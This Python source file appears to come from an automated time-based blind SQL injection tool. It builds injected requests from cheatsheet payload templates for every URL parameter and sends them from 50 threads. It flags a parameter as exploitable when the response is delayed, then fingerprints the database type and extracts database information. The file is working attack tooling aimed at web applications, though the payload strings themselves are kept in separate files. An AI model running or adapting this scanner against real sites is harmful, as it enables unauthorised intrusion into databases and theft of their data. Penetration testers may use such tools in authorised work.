from typing import Iterable, TypeVar
from requests import Response
from datetime import datetime, timedelta
from multiprocessing.pool import ThreadPool

from web import Link, ExploitLink
from dbtype import DBType
from search.getinfo import GetInfo
from search.gettype import GetType

DEFAULT_ERR_RANGE = 0.5
DEFAULT_DELAY_TIME = 1



T = TypeVar('T')

def read_cheatsheet(cheatsheet_path: str) -> list[str]:
    with open(f"{cheatsheet_path}/delay_command.txt", 'r', newline="") as f:
        delay_command = f.read().splitlines()
    with open(f"{cheatsheet_path}/form.txt", 'r', newline="") as f:
        form = f.read().splitlines()
    return form, delay_command
    
def aver(something: Iterable[T]) -> T:
    # 그냥 sum(something)/len(something) 하면 안되는게있네
    _iter = iter(something)
    sum = next(_iter)
    c = 1
    for i in _iter:
        sum += i
        c += 1
    return sum/c

class SQLi:
    
    err_range: float
    delay_time: float
    normal_elapsed: timedelta

    def __init__(self,
            err_range: float = DEFAULT_ERR_RANGE,
            delay_time: float = DEFAULT_DELAY_TIME
            ) -> None:
        self.err_range = err_range
        self.delay_time = delay_time


    def run(self, link: Link, cheatsheet: tuple[list[str], list[str]]):
        self.normal_elapsed = aver(link.request().elapsed for _ in range(10))
        exploitable_link = self.get_exploitable_links(link, cheatsheet)
        # dbtype = self.get_dbtype(exploitable_link)
        dbtype = GetType(exploitable_link.ex_request, self.is_exed).run()
        dbinfo = GetInfo(exploitable_link.ex_request, self.is_exed, dbtype).run()
        return dbtype, dbinfo


    def create_exploit_links(self, link: Link, cheatsheet: tuple[list[str], list[str]]) -> list[ExploitLink]:
        exploit_links = []
        cheatsheet_form = cheatsheet[0]
        cheatsheet_toexec = [i.format(delay_time=self.delay_time) for i in cheatsheet[1]]
        for key in link.params.keys():
            for form in cheatsheet_form:
                for delay_command in cheatsheet_toexec:
                    # payload = self.create_payload(form, toexec)
                    payload = form.format(toexec=delay_command)
                    exploit_link = link.to_exploit(key, payload, form, delay_command, params={key:payload})
                    exploit_links.append(exploit_link)
        return exploit_links


    def is_exed(self, tryed: Response) -> bool:
        return self.normal_elapsed+timedelta(seconds=self.err_range) < tryed.elapsed

    def get_exploitable_links(self, link: Link, cheatsheet: tuple[list[str], list[str]]) -> ExploitLink:
        pool = ThreadPool(processes=50)
        def _tester(exploit_link: ExploitLink):
            try_response = exploit_link.request()
            return self.is_exed(try_response)
        exploit_links = self.create_exploit_links(link, cheatsheet)
        result = pool.map(_tester, exploit_links)
        succeed = [exploit_links[i] for i in range(len(exploit_links)) if result[i]]
        # print(succeed)
        return succeed[0]       #굳이 여러개 필요없음
        

    # def get_dbtype(self, link: ExploitLink) -> DBType:
    #     for version, command_get_version in version_command.items():
    #         try_response = link.ex_request(command_get_version)
    #         if self.is_exed(try_response):
    #             return version
    #     return DBType.other